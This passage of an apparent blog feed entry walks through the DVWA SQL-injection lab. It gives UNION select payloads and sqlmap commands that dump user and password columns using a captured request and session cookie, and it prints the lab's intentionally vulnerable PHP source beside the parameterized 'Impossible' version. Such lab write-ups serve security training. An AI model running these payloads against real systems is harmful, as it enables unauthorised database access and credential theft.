+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select user,password from users#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240412102914074" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735724.png"></p>
+<p>SQLmap工具使用</p>
+<p>将第一步抓到的数据保存在桌面，命名为1.txt文件</p>
+<p><img alt="image-20240603112004596" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735725.png"></p>
+<p>使用 <code>-r</code> 参数指定文件路径。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie &#34;PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=medium&#34; --batch --dbs
+</span></span><span class="line"><span class="cl">// -r REQUESTFILE      从文件中读取 HTTP 请求
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240603101812626" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735726.png"></p>
+<p>操作步骤与前面一致，最后得到user、password数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie &#34;PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=medium&#34; --batch -D dvwa -T users -C user,password --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240603102226671" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735727.png"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;Submit&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get input
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$id</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">],</span> <span class="nv">$id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//ysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//在以下字符前添加反斜线：\x00、\n、\r、\、&#39;、&#34; 和 \x1a.
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$query</span>  <span class="o">=</span> <span class="s2">&#34;SELECT first_name, last_name FROM users WHERE user_id = </span><span class="si">$id</span><span class="s2">;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">],</span> <span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get results
+</span></span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span> <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_assoc</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Display values
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$first</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&#34;first_name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$last</span>  <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&#34;last_name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$html</span> <span class="o">.=</span> <span class="s2">&#34;&lt;pre&gt;ID: </span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">&lt;br /&gt;First name: </span><span class="si">{</span><span class="nv">$first</span><span class="si">}</span><span class="s2">&lt;br /&gt;Surname: </span><span class="si">{</span><span class="nv">$last</span><span class="si">}</span><span class="s2">&lt;/pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// This is used later on in the index.php page
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Setting it here so we can close the database connection in here like in the rest of the source scripts
+</span></span></span><span class="line"><span class="cl"><span class="nv">$query</span>  <span class="o">=</span> <span class="s2">&#34;SELECT COUNT(*) FROM users;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">],</span>  <span class="nv">$query</span> <span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="p">((</span><span class="nx">is_object</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">]))</span> <span class="o">?</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">])</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$___mysqli_res</span> <span class="o">=</span> <span class="nx">mysqli_connect_error</span><span class="p">())</span> <span class="o">?</span> <span class="nv">$___mysqli_res</span> <span class="o">:</span> <span class="k">false</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$number_of_rows</span> <span class="o">=</span> <span class="nx">mysqli_fetch_row</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="high">High</h3>
+<p>1、点击链接弹出小窗，提交1，使用BurpSuite抓包。</p>
+<p><img alt="image-20240603092627559" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735728.png"></p>
+<p><img alt="image-20240603092835322" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735729.png"></p>
+<p>尝试放包，回显信息出现在原页面</p>
+<p><img alt="image-20240603093053482" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735730.png"></p>
+<p>2、注入方式与Low、Medium级别一致，最后得到user、password数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; union select user,password from users#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240603093607403" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735731.png"></p>
+<p>SQLmap工具使用</p>
+<p>因为提交数据与回显数据的页面不同，所以需要添加第二个回显地址。将第一步抓到的数据保存在桌面，命名为1.txt文件，使用 <code>-r</code> 参数指定文件路径。 <code>--second-url</code> 参数指定会先页面URL。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url &#34;http://dvwa/vulnerabilities/sqli/&#34; --cookie &#34;PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=high&#34; --batch --dbs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240603100335290" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735732.png"></p>
+<p>操作步骤与前面一致，最后得到user、password数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url &#34;http://dvwa/vulnerabilities/sqli/&#34; --cookie &#34;PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=high&#34; --batch -D dvwa -T users -C user,password --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240603101120077" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735733.png"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_SESSION</span> <span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get input
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Check database
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$query</span>  <span class="o">=</span> <span class="s2">&#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 1;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">],</span> <span class="nv">$query</span> <span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span> <span class="s1">&#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get results
+</span></span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span> <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_assoc</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Get values
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$first</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&#34;first_name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$last</span>  <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&#34;last_name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$html</span> <span class="o">.=</span> <span class="s2">&#34;&lt;pre&gt;ID: </span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">&lt;br /&gt;First name: </span><span class="si">{</span><span class="nv">$first</span><span class="si">}</span><span class="s2">&lt;br /&gt;Surname: </span><span class="si">{</span><span class="nv">$last</span><span class="si">}</span><span class="s2">&lt;/pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">((</span><span class="nx">is_null</span><span class="p">(</span><span class="nv">$___mysqli_res</span> <span class="o">=</span> <span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">])))</span> <span class="o">?</span> <span class="k">false</span> <span class="o">:</span> <span class="nv">$___mysqli_res</span><span class="p">);</span>		
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="impossible">Impossible</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;Submit&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Check Anti-CSRF token
+</span></span></span><span class="line"><span class="cl">    <span class="nx">checkToken</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="s1">&#39;user_token&#39;</span> <span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span> <span class="s1">&#39;session_token&#39;</span> <span class="p">],</span> <span class="s1">&#39;index.php&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Get input
+</span></span></span><span class="line"><span class="cl">    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Was a number entered?
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span> <span class="nv">$id</span> <span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">       <span class="c1">// Check the database
+</span></span></span><span class="line"><span class="cl">       <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span> <span class="s1">&#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">       <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span> <span class="s1">&#39;:id&#39;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">       <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">       <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="c1">// Make sure only 1 result is returned
+</span></span></span><span class="line"><span class="cl">       <span class="k">if</span><span class="p">(</span> <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">rowCount</span><span class="p">()</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="c1">// Get values
+</span></span></span><span class="line"><span class="cl">          <span class="nv">$first</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span> <span class="s1">&#39;first_name&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$last</span>  <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span> <span class="s1">&#39;last_name&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">          <span class="nv">$html</span> <span class="o">.=</span> <span class="s2">&#34;&lt;pre&gt;ID: </span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">&lt;br /&gt;First name: </span><span class="si">{</span><span class="nv">$first</span><span class="si">}</span><span class="s2">&lt;br /&gt;Surname: </span><span class="si">{</span><span class="nv">$last</span><span class="si">}</span><span class="s2">&lt;/pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">       <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Generate Anti-CSRF token
+</span></span></span><span class="line"><span class="cl"><span class="nx">generateSessionToken</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div>]]></content:encoded>
+    </item>
+  </channel>
+</rss>
